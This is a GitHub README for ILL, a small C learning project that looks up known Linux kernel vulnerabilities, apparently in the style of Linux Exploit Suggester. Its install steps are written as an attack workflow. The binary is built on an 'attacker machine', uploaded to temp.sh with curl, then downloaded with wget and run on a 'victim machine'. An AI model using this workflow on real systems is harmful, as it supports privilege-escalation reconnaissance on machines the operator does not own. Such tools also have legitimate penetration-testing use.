# 🐧 ILL (I Love Linux)
> 🐧 I Love Linux (ILL) is a C tool developed to fast search for kernel vulnerabilities and suggest to the user

<div align="center">
 <img src="https://i.imgur.com/ZetqrA2.jpg" width="850">
</div>

<br>

<p align="center">
    <img src="https://img.shields.io/github/license/oppsec/ILL?color=black&logo=github&logoColor=white&style=for-the-badge">
    <img src="https://img.shields.io/github/issues/oppsec/ILL?color=black&logo=github&logoColor=white&style=for-the-badge">
    <img src="https://img.shields.io/github/stars/oppsec/ILL?color=black&label=STARS&logo=github&logoColor=white&style=for-the-badge">
    <img src="https://img.shields.io/github/forks/oppsec/ILL?color=black&logo=github&logoColor=white&style=for-the-badge">
    <img src="https://img.shields.io/github/languages/code-size/oppsec/ILL?color=black&logo=github&logoColor=white&style=for-the-badge">
</p>

___

### What is ILL?
**ILL** is a projected that I developed to learn C, I got some inspiration from LSE (Linux Exploit Suggester) and tried to create something simular to it but, I still recommend you to use [LSE](https://github.com/The-Z-Labs/linux-exploit-suggester). ILL, is a simple project to search for kernel already-know vulnerabilities.

<br>

### ⚡ Installing / Getting started

A quick guide of how to install and use ILL.

```shell
1. (attacker machine) https://github.com/oppsec/ILL.git
2. (attacker machine) gcc main.c -o ill
3. (attacker machine) curl -T ill temp.sh
4. (victim machine) wget http://temp.sh/example
5. (victim machine) chmod +x ill; ./ill
```

<br>

### ⚙️ Pre-requisites
- [GCC](https://gcc.gnu.org/) installed on your machine

<br>

### ✨ Features
- Extremely fast
- Low RAM and CPU usage
- Made in C

<br>

### Contributing

A quick guide of how to contribute with the project.

```shell
1. Create a fork from ILL repository
2. Download the project with git clone https://github.com/your/ILL.git
3. cd ILL/
4. Make your changes
5. Commit and make a git push
6. Open a pull request
```

<br>

### ⚠️ Warning
- The developer is not responsible for any malicious use of this tool.